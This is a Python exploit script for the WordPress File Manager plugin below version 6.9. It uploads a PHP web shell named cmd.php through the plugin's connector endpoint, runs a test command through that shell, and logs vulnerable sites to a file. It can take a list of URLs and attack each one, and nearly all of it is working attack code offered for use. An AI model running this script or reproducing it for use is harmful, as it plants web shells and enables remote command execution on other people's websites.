#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
# File Manager < 6.9 - Arbitrary File Upload leading to RCE
# 
#
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False,help="URL of host to check will need http or https")
parser.add_argument("-f", "--file",required=False, help="File of URLS to check")


args = parser.parse_args()
files = args.file
URL = args.url

def test_page(URL):
	print ("[+] Testing "+URL+" [+]")
	




	url = ""+URL+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074", "Connection": "close"}
	data = "-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"cmd.php\"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"
	response = requests.post(url, headers=headers, data=data,timeout=10,verify=False)
	
	
	if "dispInlineRegex" in response.text:
		print ("[*]Shell Uploaded "+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id[*]")
		r = requests.get(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id",timeout=10,verify=False,headers=headers)
		print ("Output: "+r.text+"")
		text_file = open("vun.txt", "a")
		text_file.write(""+URL+"/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id\n")
		text_file.close()
	else:
		print("[*] Shell Upload Failed[*]")
		print(response.text)


if files:
	if os.path.exists(files):
		with open(files, 'r') as f:
			for line in f:
				URL = line.replace("\n","")
				try:
					test_page(URL)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
				
elif URL:
	test_page(URL)
	
else:
	print("[-] No Options Set [-]")
